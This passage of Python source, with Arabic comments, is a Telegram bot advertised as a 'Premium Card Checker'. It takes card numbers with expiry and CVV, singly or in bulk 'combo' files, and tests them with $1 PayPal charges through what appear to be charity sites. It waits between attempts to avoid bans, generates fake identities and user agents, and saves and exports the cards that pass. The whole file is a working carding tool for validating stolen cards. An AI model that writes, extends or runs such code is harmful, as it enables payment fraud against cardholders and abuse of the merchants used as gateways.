    last_name = user_info.get('last_name', '') if user_info else ''
    email = user_info.get('email', 'Unknown') if user_info else 'Unknown'
    
    formatted = (
        f"💳 Card Check Result\n"
        f"━━━━━━━━━━━━━━━━━━━━\n"
        f"📟 Card: {card_display}\n"
        f"📅 Expiry: {month}/{year}\n"
        f"🏦 Bank: {bank}\n"
        f"🌍 Country: {country} {flag}\n"
        f"🏷 Type: {card_type} {brand}\n"
        f"━━━━━━━━━━━━━━━━━━━━\n"
        f"{status_emoji} Status: {status_text}\n"
        f"📝 Response: {result_msg}\n"
        f"⏱ Time: {time_taken}s\n"
        f"━━━━━━━━━━━━━━━━━━━━\n"
        f"👤 Name: {first_name} {last_name}\n"
        f"📧 Email: {email}\n"
        f"━━━━━━━━━━━━━━━━━━━━\n"
        f"🤖 Bot: @chkchannel11"
    )
    
    return formatted

async def process_combo_file(file_path, user_id, message, gateway_type="crisiscafe"):
    """معالجة ملف كومبو"""
    valid_count = 0
    total_count = 0
    
    try:
        async with aiofiles.open(file_path, 'r', encoding='utf-8') as f:
            lines = await f.readlines()
        
        for i, line in enumerate(lines, 1):
            if not line.strip():
                continue
            
            total_count += 1
            
            # تحديث الرسالة كل 3 بطاقات
            if i % 3 == 0 or i == len(lines):
                status_msg = f"⏳ Processing... [{i}/{len(lines)}]\n✅ Valid: {valid_count} | ❌ Invalid: {total_count - valid_count}"
                try:
                    await message.edit_text(status_msg)
                except:
                    pass
            
            # معالجة البطاقة
            result = gateway.process_single_card(line.strip(), gateway_type)
            
            # تحديث الإحصائيات
            await update_user_stats(user_id, result)
            
            # حفظ البطاقات الصالحة
            if result['status'] == 'CHARGED':
                valid_count += 1
                await save_valid_card(line.strip(), result)
            
            # تأخير بين البطاقات لتجنب الحظر
            await asyncio.sleep(2)
        
        return valid_count, total_count
        
    except Exception as e:
        logger.error(f"Error processing combo file: {e}")
        return 0, 0

# ===========================================
# معالجات الأوامر
# ===========================================
@router.message(CommandStart())
async def cmd_start(message: Message):
    """معالج أمر /start"""
    user_id = message.from_user.id
    username = message.from_user.username or "Unknown"
    
    # إنشاء لوحة مفاتيح
    keyboard = InlineKeyboardBuilder()
    keyboard.add(
        InlineKeyboardButton(text="💳 Single Check", callback_data="single_check"),
        InlineKeyboardButton(text="📁 Combo Check", callback_data="combo_check"),
        InlineKeyboardButton(text="🌐 Select Gateway", callback_data="select_gateway"),
        InlineKeyboardButton(text="📊 Statistics", callback_data="stats"),
        InlineKeyboardButton(text="ℹ️ Help", callback_data="help"),
        InlineKeyboardButton(text="🛠️ Generate User Info", callback_data="generate_info"),
        InlineKeyboardButton(text="📢 Join Channel", url="https://t.me/chkchannel11")
    )
    keyboard.adjust(2)
    
    welcome_text = f"""
{CHANEL_LOGO}

👋 **Welcome, @{username}!**

🚀 **Premium Card Checker Bot**
🔐 Multi-Gateway Support (PayPal)
⚡ Fast & Accurate Results
📊 Detailed Card Information
👤 Auto User Info Generation

📌 **Available Gateways:**
• 💰 CrisisCafe PayPal $1
• 💰 RareDiseases PayPal $1

📢 **Channel:** @chkchannel11
🆔 **Your ID:** `{user_id}`

👇 **Choose an option below:**
"""
    
    await message.answer(
        welcome_text,
        reply_markup=keyboard.as_markup(),
        parse_mode=ParseMode.MARKDOWN
    )

@router.callback_query(F.data == "select_gateway")
async def select_gateway_handler(callback: CallbackQuery):
    """معالج اختيار البوابة"""
    keyboard = InlineKeyboardBuilder()
    keyboard.add(
        InlineKeyboardButton(text="💰 CrisisCafe PayPal $1", callback_data="gateway:crisiscafe"),
        InlineKeyboardButton(text="💰 RareDiseases PayPal $1", callback_data="gateway:rarediseases"),
        InlineKeyboardButton(text="🔙 Back", callback_data="back_main")
    )
    keyboard.adjust(1)
    
    await callback.message.edit_text(
        "🌐 **Select Gateway**\n\n"
        "Choose the gateway you want to use:\n\n"
        "• **CrisisCafe** - PayPal Commerce $1 Charge\n"
        "• **RareDiseases** - PayPal Commerce $1 Charge\n\n"
        "⚠️ Both gateways charge $1 for verification.",
        reply_markup=keyboard.as_markup(),
        parse_mode=ParseMode.MARKDOWN
    )
    await callback.answer()

@router.callback_query(F.data.startswith("gateway:"))
async def gateway_selected_handler(callback: CallbackQuery):
    """معالج البوابة المحددة"""
    gateway_type = callback.data.split(":")[1]
    user_id = callback.from_user.id
    
    # حفظ البوابة المحددة
    if user_id not in user_sessions:
        user_sessions[user_id] = {}
    user_sessions[user_id]['gateway'] = gateway_type
    
    gateway_name = "CrisisCafe" if gateway_type == "crisiscafe" else "RareDiseases"
    
    await callback.message.edit_text(
        f"✅ **Gateway Selected:** {gateway_name}\n\n"
        "Now you can check cards using this gateway.\n\n"
        "💳 Send a card to check or use /start to go back.",
        parse_mode=ParseMode.MARKDOWN
    )
    await callback.answer(f"Gateway set to {gateway_name}")

@router.callback_query(F.data == "single_check")
async def single_check_handler(callback: CallbackQuery):
    """معالج فحص بطاقة واحدة"""
    user_id = callback.from_user.id
    gateway_type = user_sessions.get(user_id, {}).get('gateway', 'crisiscafe')
    gateway_name = "CrisisCafe" if gateway_type == "crisiscafe" else "RareDiseases"
    
    await callback.message.edit_text(
        f"💳 **Single Card Check**\n\n"
        f"🌐 **Current Gateway:** {gateway_name}\n\n"
        "📝 Please send your card in one of these formats:\n"
        "• `5208130007850658|09|26|768`\n"
        "• `5208130007850658/09/26/768`\n"
        "• `5208130007850658 09 26 768`\n\n"
        "⏳ I will check it immediately!\n\n"
        "🔙 /back to main menu",
        parse_mode=ParseMode.MARKDOWN
    )
    await callback.answer()

@router.message(F.text.regexp(r'^\d{13,19}[\|\/\s;:]\d{1,2}[\|\/\s;:]\d{2,4}[\|\/\s;:]\d{3,4}$'))
async def process_single_card_handler(message: Message):
    """معالج البطاقة الواحدة"""
    user_id = message.from_user.id
    card_line = message.text.strip()
    
    # الحصول على البوابة المحددة
    gateway_type = user_sessions.get(user_id, {}).get('gateway', 'crisiscafe')
    gateway_name = "CrisisCafe" if gateway_type == "crisiscafe" else "RareDiseases"
    
    # رسالة المعالجة
    processing_msg = await message.answer(
        f"🔄 **Processing Card...**\n\n"
        f"🌐 Gateway: {gateway_name}\n"
        "⏳ Please wait, this may take a few seconds...",
        parse_mode=ParseMode.MARKDOWN
    )
    
    try:
        # معالجة البطاقة
        result = gateway.process_single_card(card_line, gateway_type)
        
        # تحديث الإحصائيات
        await update_user_stats(user_id, result)
        
        # حفظ البطاقة إذا كانت صالحة
        if result['status'] == 'CHARGED':
            await save_valid_card(card_line, result)
        
        # تنسيق النتيجة
        formatted_result = await format_card_result(card_line, result)
        
        # إنشاء لوحة مفاتيح
        keyboard = InlineKeyboardBuilder()
        keyboard.add(
            InlineKeyboardButton(text="💳 Check Another", callback_data="single_check"),
            InlineKeyboardButton(text="🔙 Main Menu", callback_data="back_main")
        )
        
        await processing_msg.edit_text(
            formatted_result,
            reply_markup=keyboard.as_markup()
        )
        
    except Exception as e:
        logger.error(f"Error processing card: {e}")
        await processing_msg.edit_text(
            f"❌ Error processing card:\n{str(e)}\n\n"
            "Please check the format and try again."
        )

@router.callback_query(F.data == "combo_check")
async def combo_check_handler(callback: CallbackQuery):
    """معالج فحص كومبو"""
    user_id = callback.from_user.id
    gateway_type = user_sessions.get(user_id, {}).get('gateway', 'crisiscafe')
    gateway_name = "CrisisCafe" if gateway_type == "crisiscafe" else "RareDiseases"
    
    await callback.message.edit_text(
        f"📁 **Combo File Check**\n\n"
        f"🌐 **Current Gateway:** {gateway_name}\n\n"
        "📎 Please send me a `.txt` file containing cards.\n\n"
        "📝 **File Format:**\n"
        "• One card per line\n"
        "• Format: `CC|MM|YY|CVV`\n"
        "• Example: `5208130007850658|09|26|768`\n\n"
        "⚡ **Features:**\n"
        "• Auto-saves valid cards\n"
        "• Live progress updates\n"
        "• Detailed results\n\n"
        "🔙 /back to main menu",
        parse_mode=ParseMode.MARKDOWN
    )
    await callback.answer()

@router.message(F.document)
async def process_combo_file_handler(message: Message):
    """معالج ملف كومبو"""
    user_id = message.from_user.id
    
    # التحقق من نوع الملف
    if not message.document.file_name.endswith('.txt'):
        await message.answer("❌ Please send only `.txt` files!")
        return
    
    # تنزيل الملف
    file_info = await message.bot.get_file(message.document.file_id)
    file_path = f"temp_{user_id}_{message.document.file_name}"
    
    try:
        # تنزيل الملف
        await message.bot.download_file(file_info.file_path, file_path)
        
        # قراءة عدد الأسطر
        async with aiofiles.open(file_path, 'r', encoding='utf-8') as f:
            lines = await f.readlines()
            total_cards = len([l for l in lines if l.strip()])
        
        if total_cards == 0:
            await message.answer("❌ File is empty or has invalid format!")
            os.remove(file_path)
            return
        
        gateway_type = user_sessions.get(user_id, {}).get('gateway', 'crisiscafe')
        gateway_name = "CrisisCafe" if gateway_type == "crisiscafe" else "RareDiseases"
        
        # تأكيد بدء المعالجة
        confirm_text = f"""
📁 **Combo Check Ready**

📊 **File Info:**
• 📄 File: `{message.document.file_name}`
• 💳 Cards: `{total_cards}` lines
• 👤 User: @{message.from_user.username}
• 🌐 Gateway: {gateway_name}

⚠️ **This may take some time depending on the file size.**
⚠️ **Do not send other commands during processing.**

✅ **Start processing?**
"""
        
        keyboard = InlineKeyboardBuilder()
        keyboard.add(
            InlineKeyboardButton(text="✅ Start Processing", callback_data=f"start_combo:{file_path}"),
            InlineKeyboardButton(text="❌ Cancel", callback_data="back_main")
        )
        
        await message.answer(
            confirm_text,
            reply_markup=keyboard.as_markup(),
            parse_mode=ParseMode.MARKDOWN
        )
        
    except Exception as e:
        logger.error(f"Error handling combo file: {e}")
        await message.answer(f"❌ Error processing file: {str(e)}")

@router.callback_query(F.data.startswith("start_combo:"))
async def start_combo_processing(callback: CallbackQuery):
    """بدء معالجة كومبو"""
    file_path = callback.data.split(":")[1]
    user_id = callback.from_user.id
    
    gateway_type = user_sessions.get(user_id, {}).get('gateway', 'crisiscafe')
    gateway_name = "CrisisCafe" if gateway_type == "crisiscafe" else "RareDiseases"
    
    # رسالة البداية
    processing_msg = await callback.message.edit_text(
        f"🔄 **Starting Combo Processing...**\n"
        f"🌐 Gateway: {gateway_name}\n"
        "⏳ Please wait, this may take a while.\n"
        "📊 Cards: Loading...\n"
        "✅ Valid: 0\n"
        "❌ Invalid: 0\n"
        "⏱️ Time: 0s",
        parse_mode=ParseMode.MARKDOWN
    )
    
    try:
        start_time = time.time()
        
        # معالجة الملف
        valid_count, total_count = await process_combo_file(
            file_path, user_id, processing_msg, gateway_type
        )
        
        elapsed_time = round(time.time() - start_time, 1)
        
        # النتيجة النهائية
        result_text = f"""
✅ **Combo Processing Complete!**

📊 **Results:**
• 📄 File: Processed
• 🌐 Gateway: {gateway_name}
• 💳 Total Cards: `{total_count}`
• ✅ Valid Cards: `{valid_count}`
• ❌ Invalid Cards: `{total_count - valid_count}`
• ⏱️ Time Taken: `{elapsed_time} seconds`
• 📈 Success Rate: `{round((valid_count/total_count)*100, 2) if total_count > 0 else 0}%`

💾 **Valid cards have been saved to:** `{VALID_CARDS_FILE}`

🎉 **Done!** You can download the results file or check another combo.
"""
        
        keyboard = InlineKeyboardBuilder()
        if valid_count > 0 and os.path.exists(VALID_CARDS_FILE):
            keyboard.add(
                InlineKeyboardButton(text="📥 Download Results", callback_data="download_results"),
                InlineKeyboardButton(text="🔄 New Combo", callback_data="combo_check"),
                InlineKeyboardButton(text="🔙 Main Menu", callback_data="back_main")
            )
        else:
            keyboard.add(
                InlineKeyboardButton(text="🔄 New Combo", callback_data="combo_check"),
                InlineKeyboardButton(text="💳 Single Check", callback_data="single_check"),
                InlineKeyboardButton(text="🔙 Main Menu", callback_data="back_main")
            )
        keyboard.adjust(2)
        
        await processing_msg.edit_text(
            result_text,
            reply_markup=keyboard.as_markup(),
            parse_mode=ParseMode.MARKDOWN
        )
        
        # حذف الملف المؤقت
        if os.path.exists(file_path):
            os.remove(file_path)
            
    except Exception as e:
        logger.error(f"Error in combo processing: {e}")
        await processing_msg.edit_text(
            f"❌ **Error during processing:**\n`{str(e)}`\n\n"
            "Please try again or contact support.",
            parse_mode=ParseMode.MARKDOWN
        )
        
        # حذف الملف المؤقت في حالة الخطأ
        if os.path.exists(file_path):
            os.remove(file_path)
    
    await callback.answer()

@router.callback_query(F.data == "download_results")
async def download_results_handler(callback: CallbackQuery):
    """تحميل نتائج البطاقات الصالحة"""
    if os.path.exists(VALID_CARDS_FILE):
        try:
            # إرسال الملف
            document = FSInputFile(VALID_CARDS_FILE, filename="valid_cards.txt")
            await callback.bot.send_document(
                chat_id=callback.from_user.id,
                document=document,
                caption="✅ **Valid Cards File**\n\n"
                       "📅 Generated: " + datetime.now().strftime("%Y-%m-%d %H:%M:%S") + "\n"
                       "📢 Channel: @chkchannel11",
                parse_mode=ParseMode.MARKDOWN
            )
        except Exception as e:
            await callback.answer("❌ Error sending file!", show_alert=True)
    else:
        await callback.answer("❌ No valid cards file found!", show_alert=True)
    
    await callback.answer()

@router.callback_query(F.data == "stats")
async def stats_handler(callback: CallbackQuery):
    """عرض إحصائيات المستخدم"""
    user_id = callback.from_user.id
    stats = user_stats.get(user_id, {})
    
    stats_text = f"""
📊 **Your Statistics**

👤 **User:** @{callback.from_user.username or 'Unknown'}
🆔 **ID:** `{user_id}`

📈 **Card Checks:**
• 💳 Total Checked: `{stats.get('total_checked', 0)}`
• ✅ Valid Cards: `{stats.get('valid_cards', 0)}`
• ❌ Declined Cards: `{stats.get('declined_cards', 0)}`
• 📊 Success Rate: `{round((stats.get('valid_cards', 0) / max(stats.get('total_checked', 1), 1)) * 100, 2)}%`

⏰ **Last Check:** {stats.get('last_check', 'Never')[:19] if stats.get('last_check') else 'Never'}

📢 **Channel:** @chkchannel11
"""
    
    keyboard = InlineKeyboardBuilder()
    keyboard.add(
        InlineKeyboardButton(text="🔄 Refresh", callback_data="stats"),
        InlineKeyboardButton(text="🔙 Main Menu", callback_data="back_main")
    )
    
    await callback.message.edit_text(
        stats_text,
        reply_markup=keyboard.as_markup(),
        parse_mode=ParseMode.MARKDOWN
    )
    await callback.answer()

@router.callback_query(F.data == "generate_info")
async def generate_info_handler(callback: CallbackQuery):
    """إنشاء معلومات مستخدم عشوائية"""
    user_info = gateway.generate_user_info()
    
    info_text = f"""
🛠️ **Generated User Information**

👤 **Personal Info:**
• 📛 First Name: `{user_info['first_name']}`
• 📛 Last Name: `{user_info['last_name']}`
• 📧 Email: `{user_info['email']}`

🌐 **Browser Info:**
• 🖥️ User Agent: `{user_info['user_agent'][:50]}...`

🔄 Click "Generate New" to create new info.
"""
    
    keyboard = InlineKeyboardBuilder()
    keyboard.add(
        InlineKeyboardButton(text="🔄 Generate New", callback_data="generate_info"),
        InlineKeyboardButton(text="🔙 Main Menu", callback_data="back_main")
    )
    
    await callback.message.edit_text(
        info_text,
        reply_markup=keyboard.as_markup(),
        parse_mode=ParseMode.MARKDOWN
    )
    await callback.answer()

@router.callback_query(F.data == "help")
async def help_handler(callback: CallbackQuery):
    """عرض المساعدة"""
    help_text = """
ℹ️ **Help & Information**

📌 **How to Use:**

1️⃣ **Single Card Check:**
   • Send a card in format: `CC|MM|YY|CVV`
   • Example: `5208130007850658|09|26|768`

2️⃣ **Combo File Check:**
   • Send a `.txt` file with cards
   • One card per line

3️⃣ **Select Gateway:**
   • Choose between CrisisCafe or RareDiseases
   • Both charge $1 for verification

📝 **Supported Formats:**
• `CC|MM|YY|CVV`
• `CC/MM/YY/CVV`
• `CC MM YY CVV`

⚠️ **Important Notes:**
• Cards are checked via PayPal Commerce
• Valid cards will be charged $1
• Results are saved automatically

📢 **Support:** @chkchannel11
"""
    
    keyboard = InlineKeyboardBuilder()
    keyboard.add(
        InlineKeyboardButton(text="🔙 Main Menu", callback_data="back_main")
    )
    
    await callback.message.edit_text(
        help_text,
        reply_markup=keyboard.as_markup(),
        parse_mode=ParseMode.MARKDOWN
    )
    await callback.answer()

@router.callback_query(F.data == "back_main")
async def back_main_handler(callback: CallbackQuery):
    """العودة للقائمة الرئيسية"""
    user_id = callback.from_user.id
    username = callback.from_user.username or "Unknown"
    
    # إنشاء لوحة مفاتيح
    keyboard = InlineKeyboardBuilder()
    keyboard.add(
        InlineKeyboardButton(text="💳 Single Check", callback_data="single_check"),
        InlineKeyboardButton(text="📁 Combo Check", callback_data="combo_check"),
        InlineKeyboardButton(text="🌐 Select Gateway", callback_data="select_gateway"),
        InlineKeyboardButton(text="📊 Statistics", callback_data="stats"),
        InlineKeyboardButton(text="ℹ️ Help", callback_data="help"),
        InlineKeyboardButton(text="🛠️ Generate User Info", callback_data="generate_info"),
        InlineKeyboardButton(text="📢 Join Channel", url="https://t.me/chkchannel11")
    )
    keyboard.adjust(2)
    
    welcome_text = f"""
{CHANEL_LOGO}

👋 **Welcome back, @{username}!**

🚀 **Premium Card Checker Bot**
🔐 Multi-Gateway Support (PayPal)
⚡ Fast & Accurate Results

📌 **Available Gateways:**
• 💰 CrisisCafe PayPal $1
• 💰 RareDiseases PayPal $1

👇 **Choose an option below:**
"""
    
    await callback.message.edit_text(
        welcome_text,
        reply_markup=keyboard.as_markup(),
        parse_mode=ParseMode.MARKDOWN
    )
    await callback.answer()

@router.message(Command("back"))
async def cmd_back(message: Message):
    """العودة للقائمة الرئيسية"""
    await cmd_start(message)

# ===========================================
# الدالة الرئيسية
# ===========================================
async def main():
    """الدالة الرئيسية لتشغيل البوت"""
    # إنشاء كائن البوت
    bot = Bot(token=BOT_TOKEN, default=DefaultBotProperties(parse_mode=ParseMode.MARKDOWN))
    
    # إنشاء وإعداد المشرف
    dp = Dispatcher()
    dp.include_router(router)
    
    # بدء البوت
    logger.info("Starting Premium Card Checker Bot...")
    logger.info("Gateways: CrisisCafe, RareDiseases")
    await dp.start_polling(bot)

if __name__ == "__main__":
    # إنشاء الملفات إذا لم تكن موجودة
    if not os.path.exists(VALID_CARDS_FILE):
        with open(VALID_CARDS_FILE, 'w', encoding='utf-8') as f:
            f.write("# Valid Cards File\n# Generated by Premium Card Checker Bot\n\n")
    
    if not os.path.exists(USER_STATS_FILE):
        with open(USER_STATS_FILE, 'w', encoding='utf-8') as f:
            json.dump({}, f)
    else:
        # تحميل الإحصائيات
        try:
            with open(USER_STATS_FILE, 'r', encoding='utf-8') as f:
                user_stats.update(json.load(f))
        except:
            pass
    
    # تشغيل البوت
    asyncio.run(main())
